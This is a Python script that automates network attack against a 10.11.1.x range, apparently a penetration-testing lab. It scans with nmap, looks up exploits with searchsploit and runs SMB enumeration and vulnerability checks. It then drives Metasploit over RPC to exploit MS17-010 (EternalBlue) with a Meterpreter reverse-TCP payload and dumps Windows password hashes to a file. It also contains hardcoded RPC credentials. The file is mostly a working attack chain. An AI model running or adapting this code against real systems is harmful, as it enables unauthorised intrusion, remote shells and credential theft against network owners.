#!/usr/bin/env python3

import nmap
import os
import msfrpc
import netifaces
import subprocess
import time
import xml.etree.ElementTree as ET

networkRange = '10.11.1.1-254'
workingDir = '/tmp'

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][0]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

nm = nmap.PortScanner()
res = nm.scan(hosts=networkRange, arguments='-sV -O --top-ports 10')
cmd = nm.command_line()

print("Hosts: ", sorted(res['scan'].keys()))
print("----------------------")

# Defining lists to be used
upHostsLIST = sorted(list(res['scan'].keys()))
hostsWithTCPPort = sorted([])

linuxHosts = sorted([])  # Linux hosts
windowsHosts = sorted([])  # Windows hosts
unknownOSHosts = sorted([])

interestingPorts = [21, 22, 23, 25, 80, 443, 445, 502, 3306, 5900, 8080]
port21Hosts = sorted([])    # FTP servers
port22Hosts = sorted([])    # ssh
port23Hosts = sorted([])    # telnet
port25Hosts = sorted([])    # smtp
port80Hosts = sorted([])    # http
port110Hosts = sorted([])   # pop3
port443Hosts = sorted([])   # https
port445Hosts = sorted([])   # smb
port502Hosts = sorted([])   # modbus
port3306Hosts = sorted([])  # MySQL servers
port5900Hosts = sorted([])  # VNC servers
port8080Hosts = sorted([])  # Proxy servers

eternalBlueHosts = sorted([])  # Hosts vulnerable to ms17-010

############

for host in upHostsLIST:
    proto = nm[host].all_protocols()
    if 'tcp' in proto:
        hostsWithTCPPort.append(host)

print("Hosts with at least one TCP port: ", hostsWithTCPPort)
print("--------------------------------")


# Function to save output to csv file
def save_scan_csv(nm_csv, path=workingDir):
    with open(path + '/nmap_scan_output.csv', 'w') as output:
        output.write(nm_csv)


# Function to save out to xml file to import into msf and run searchploit against
def save_scan_xml(nm_xml, path=workingDir):
    with open(path + '/nmap_scan_output.xml', 'w') as output:
        output.write(nm_xml)


# Function to print scan output to screen and ip_info.txt
def printinfo(host, scanoutput2Print):
    print(scanoutput2Print)
    with open("%s/%s/%s_info.txt" % (workingDir, host, host), 'a') as output:
        output.write(scanoutput2Print)
    return


print("------------------------------ \n")

print("Equivalent nmap command: ", cmd)

for host in nm.all_hosts():
    mkHostDir = "mkdir %s/%s/" % (workingDir, host)
    os.system(mkHostDir)
    with open("%s/%s/%s_info.txt" % (workingDir, host, host), 'a') as output:
        hostinfo = ("%s information: \n" % (host))
        output.write(hostinfo)
        output.write("----------\n")

for host in nm.all_hosts():
    print("Host:  %s (%s)\n" % (host, nm[host].hostname()))
    hostName = "Host:  %s (%s)\n" % (host, nm[host].hostname())
    printinfo(host, hostName)
    print("State: %s\n" % nm[host].state())
    hostState = "State: %s\n" % (nm[host].state())
    printinfo(host, hostState)

    for proto in nm[host].all_protocols():
        print("----------")
        printinfo(host, "----------\n")
        print('Protocol : %s' % (proto))
        hostProto = 'Protocol : %s' % proto
        printinfo(host, hostProto)

    lport = nm[host][proto].keys()

    for port in lport:
        print("port : %s\tstate : %s" % (port, nm[host][proto][port]['state']))
        hostLport = "\nport : %s\tstate : %s" % (port, nm[host][proto][port]['state'])
        printinfo(host, hostLport)

print(nm.csv())  # Outputs csv output to screen
print(nm.get_nmap_last_output())  # Outputs xml output to screen

save_scan_csv(nm.csv())  # Saves output to csv per save_scan_csv function defined above

pathtonmapcsv = "libreoffice --calc %s/nmap_scan_output.csv &" % workingDir
os.system(pathtonmapcsv)

save_scan_xml(nm.get_nmap_last_output())  # Saves output to xml per save_scan_xml defined above

# The code below creates an nmap xml file for each host in the working directory
treexml = ET.parse('/tmp/nmap_scan_output.xml')  # Parses network nmap xml
root = treexml.getroot()

hostList = root.findall('host')  # Creates an array of the host elements

for host in hostList:
    ipaddy = host[1].attrib['addr']  # Pulls IP address from xml, uses this to determine host and directory
    print(ipaddy)
    with open('%s/%s/%s.xml' % (workingDir, ipaddy, ipaddy), 'a') as output:
        output.write(ET.tostring(host, encoding='utf8').decode('utf-8'))

# Perform a searchsploit search for each host based on xml file
for host in hostsWithTCPPort:
    searchsploitcmd = "searchsploit --colour --nmap %s/%s/%s.xml| grep Remote >> %s/%s/%s_sploitz.txt" % (
    workingDir, host, host, workingDir, host, host)
    os.system(searchsploitcmd)

###Open client connection to msf via msfrpc/msgrpc
###Start postgressql.service, start msfconsole,  load msgrpc User='msf' Pass='abc123'
# Create a new instance of the Msfrpc client with the default options
client = msfrpc.Msfrpc({})

# Login to the msfmsg server using the username and password used to load msgrpc
client.login('msf', 'abc123')
sess = client.call('console.create')
console_id = sess[b'id']  # Added 'b'
# print(sess.keys()) Used for troubleshooting and confirmed the presence of the 'b'

# client.call('console.write',[console_id,commands])
createMsfWorkspace = "workspace -a nmap\n"
client.call('console.write', [console_id, createMsfWorkspace])

changeToNmapWorkspace = "workspace nmap\n"
client.call('console.write', [console_id, changeToNmapWorkspace])

# Imports scan results into a Metasploit workspace
importScanxmlToWorkspace = "db_import /tmp/nmap_scan_output.xml \n"
client.call('console.write', [console_id, importScanxmlToWorkspace])

# Run nmap nse scripts to enumerate hosts based on open ports and OS

print("Hosts with at least one TCP port: ", hostsWithTCPPort)
print()

for host in hostsWithTCPPort:
    if res['scan'][host]['osmatch']:

        if res['scan'][host]['osmatch'][0]['osclass'][0]['osfamily'] == 'Linux':
            linuxHosts.append(host)
        if res['scan'][host]['osmatch'][0]['osclass'][0]['osfamily'] == 'Windows':
            windowsHosts.append(host)
    else:
        unknownOSHosts.append(host)

    if nm[host].has_tcp(21) == True:
        if nm[host]['tcp'][21]['state'] == 'open':
            port21Hosts.append(host)

    if nm[host].has_tcp(22) == True:
        if nm[host]['tcp'][22]['state'] == 'open':
            port22Hosts.append(host)

    if nm[host].has_tcp(23) == True:
        if nm[host]['tcp'][23]['state'] == 'open':
            port23Hosts.append(host)

    if nm[host].has_tcp(25) == True:
        if nm[host]['tcp'][25]['state'] == 'open':
            port25Hosts.append(host)

    if nm[host].has_tcp(80) == True:
        if nm[host]['tcp'][80]['state'] == 'open':
            port80Hosts.append(host)

    if nm[host].has_tcp(110) == True:
        if nm[host]['tcp'][110]['state'] == 'open':
            port110Hosts.append(host)

    if nm[host].has_tcp(445) == True:
        if nm[host]['tcp'][445]['state'] == 'open':
            port445Hosts.append(host)

    if nm[host].has_tcp(502) == True:
        if nm[host]['tcp'][502]['state'] == 'open':
            port502Hosts.append(host)

    if nm[host].has_tcp(3306) == True:
        if nm[host]['tcp'][3306]['state'] == 'open':
            port3306Hosts.append(host)

    if nm[host].has_tcp(5900) == True:
        if nm[host]['tcp'][5900]['state'] == 'open':
            port5900Hosts.append(host)

    if nm[host].has_tcp(8080) == True:
        if nm[host]['tcp'][8080]['state'] == 'open':
            port8080Hosts.append(host)

print("Linux hosts:", linuxHosts)
print("Windows hosts:", windowsHosts)
print("Unknown OS:", unknownOSHosts)
print()
print("FTP servers: ", port21Hosts)
print("ssh servers:", port22Hosts)
print("telnet servers:", port23Hosts)
print("SMTP servers", port25Hosts)
print("Web servers: ", port80Hosts)
print("SMB servers: ", port445Hosts)
print("Modbus servers: ", port502Hosts)
print("MySQL servers: ", port3306Hosts)
print("VNC servers: ", port5900Hosts)
print("Proxy servers: ", port8080Hosts)
print()

print("Performing relevant nmap script scans:")
print("**************************************")

for host in hostsWithTCPPort:
    if host in port21Hosts:
        ftpstring = "\n\n--->Running ftp-anon for: %s" % (host)
        printinfo(host, ftpstring)

        ftpAnonScan = nm.scan(host, '21', arguments='-sV --script=/usr/share/nmap/scripts/ftp-anon.nse')
        if 'script' in ftpAnonScan['scan'][host]['tcp'][21]:
            printinfo(host, "\n")

            for key, value in ftpAnonScan['scan'][host]['tcp'][21]['script'].items():
                ftpanonkeyvaluestring = ("%s : %s" % (key, value))

                with open("%s/%s/%s_info.txt" % (workingDir, host, host), 'a') as output:
                    printinfo(host, ftpanonkeyvaluestring)
                    printinfo(host, "\n-----------\n")
        else:
            printinfo(host, "\nNo results.\n")
            print()

    if host in port80Hosts:
        httpstring = "\n\n--->Running http-enum for: %s" % (host)
        printinfo(host, httpstring)

        httpEnumScan = nm.scan(host, '80', arguments='-sV --script=/usr/share/nmap/scripts/http-enum.nse')
        if 'script' in httpEnumScan['scan'][host]['tcp'][80]:
            printinfo(host, "\nInteresting directories/pages:\n")

            for key, value in httpEnumScan['scan'][host]['tcp'][80]['script'].items():
                httpenumkeyvalue = ("%s : %s\n" % (key, value))
                printinfo(host, httpenumkeyvalue)
            print("\n")

        else:
            printinfo(host, "\nNo results\n")

    if host in port445Hosts:
        if host in windowsHosts:
            runsmbenumshares = ("\n\n--->Run smb-enum-shares for: %s" % (host))
            printinfo(host, runsmbenumshares)
            smbEnumShares = nm.scan(host, '445', arguments='-sV --script=/usr/share/nmap/scripts/smb-enum-shares.nse')

            if 'hostscript' in smbEnumShares['scan'][host]:
                smbEnumSharesOutput = smbEnumShares['scan'][host]['hostscript'][0]['output']
                printinfo(host, "\n\n")
                printinfo(host, smbEnumSharesOutput)

            else:
                nosmbshares = ("No smb shares for %s\n" % (host))
                printinfo(host, nosmbshares)
                print()

        if host in linuxHosts:
            enum4linuxstring = "--->Running enum4linux on: %s" % (host)
            printinfo(host, enum4linuxstring)
            printinfo(host, "\n\nenum4linux:\n")
            enum4linuxCMD = "enum4linux -a %s |grep -v 'unknown' >> %s/%s/%s_info.txt" % (host, workingDir, host, host)
            os.system(enum4linuxCMD)
            print()

"""	
	if host in port502Hosts:
		print("Run modbus-discover for:",host)
		modbusDiscover = nm.scan(host,'502',arguments='-sV --script=/usr/share/nmap/scripts/modbus-discover.nse')

		if 'hostscript' in modbusDiscover['scan'][host].keys():
			print(modbusDiscover['scan'][host]['hostscript'][0]['output'])
		print()

	if host in port3306Hosts:
		print("Run mysql-enum for:",host)
		mysqlEnum = nm.scan(host,'3306',arguments='-sV --script=/usr/share/nmap/scripts/mysql-enum.nse')

		if 'hostscript' in mysqlEnum['scan'][host].keys():
			print(mysqlEnum['scan'][host]['hostscript'][0]['output'])
		print()

	if host in port5900Hosts:
		print("Run vnc-info for:",host)
		vncInfo = nm.scan(host,'5900',arguments=' -sV script=/usr/share/nmap/scripts/vnc-info.nse')

		if 'hostscript' in port5900Hosts['scan'][host].keys():
			print(vncInfo['scan'][host]['hostscript'][0]['output'])
		print()
"""
print("Running nmap Vulnerability scans: ")
print("*********************************\n")

for host in hostsWithTCPPort:
    if host in port445Hosts:
        if host in windowsHosts:
            print("--->Run smb-vuln scans for:", host)
            print("***********************")
            print("smb-vuln-ms-080-067 for:", host)
            smb_vuln_ms08_067 = nm.scan(host, '445', arguments='--script=/usr/share/nmap/scripts/smb-vuln-ms08-067.nse')

            if 'hostscript' in smb_vuln_ms08_067['scan'][host].keys():
                print(smb_vuln_ms08_067['hostscript']['output'].items())
                print()
            else:
                print()
                print(host, "is not vulnerable to ms08_067")
                print("***********************")
                print()

            smbvulnstring = "smb-vuln-ms-17-10 for: %s \n" % (host)
            printinfo(host, smbvulnstring)
            smb_vuln_ms17_010 = nm.scan(host, '445', arguments='--script=/usr/share/nmap/scripts/smb-vuln-ms17-010.nse')

            if 'hostscript' in smb_vuln_ms17_010['scan'][host].keys():
                smbvulnms17010 = smb_vuln_ms17_010['scan'][host]['hostscript'][0]['output']
                printinfo(host, "\n")
                printinfo(host, "\nEternalblue output:\n")
                printinfo(host, smbvulnms17010)
                if "VULNERABLE:" in smb_vuln_ms17_010['scan'][host]['hostscript'][0]['output']:
                    eternalBlueHosts.append(host)
                print()
print()

print("Hosts vulnerable to eternalblue:", eternalBlueHosts)
print("------------")

#####pwning hosts vulnerable to eternalblue and dumping the password hashes#####

for host in eternalBlueHosts:
    LHOST = get_local_ip(get_iface())
    RHOST = host
    LPORT = input("Port number to use for the handler listener (LPORT) for host %s: " % host)

    pyORmsf = input("--->How would you like your pwn for %s?  '0' for python or '1' for msf: " % (host))

    if pyORmsf == '0':
        Popenstring = "gnome-terminal -- python /root/Dropbox/PycharmProjects/callmesnakesploit/callmesnakesploit.py -lh %s -rh %s -lp %s" % (
        LHOST, RHOST, LPORT)
        ncprocess = subprocess.Popen(
            [Popenstring],
            stdout=subprocess.PIPE,
            stderr=None,
            shell=True
        )

    elif pyORmsf == '1':
        ###Exploit ms17-010_eternalblue via metasploit###

            exploitCommands = """use exploit/windows/smb/ms17_010_eternalblue \n
			set PAYLOAD windows/x64/meterpreter/reverse_tcp \n
			set LHOST """ + LHOST + """ \n
			set LPORT """ + LPORT + """ \n
			set RHOST """ + RHOST + """ \n
			set ExitOnSession true \n
			exploit -z\n
			"""

            print("[+] Exploiting MS17-010 on: " + RHOST)
            print("----------------------------- \n")
            client.call('console.write', [console_id, exploitCommands])
            exploitOutput = client.call('console.read', [console_id])
            print(exploitOutput.keys())
            print(exploitOutput[b'data'].decode("utf-8"))

            print("Pausing for 15 seconds...")
            time.sleep(15)

            ###Postexploitation###

            postSession = input("Enter the session number to run post-exploitation: ")

            hashdumpCommands = """use post/windows/gather/hashdump \n
			set SESSION """ + postSession + """ \n
			exploit \n
			"""

            hashdumpInput = client.call('console.write', [console_id, hashdumpCommands])
            print("Pausing to allow console write to complete...")
            time.sleep(11)
            hashdumpOutput = client.call('console.read', [console_id])
            hashdumpUTF8 = hashdumpOutput[b'data'].decode("utf-8")

            hash_info = False

            with open("%s/hashdumpall.txt" % (workingDir), 'w') as output:
                output.write(hashdumpUTF8)

            hashdumpallfile = open("%s/hashdumpall.txt" % (workingDir), 'r')
            hashdumplines = hashdumpallfile.readlines()
            for line in hashdumplines:
                if hash_info or "[*] Dumping password hints..." in line:
                    printinfo(host, line)
                    hash_info = True














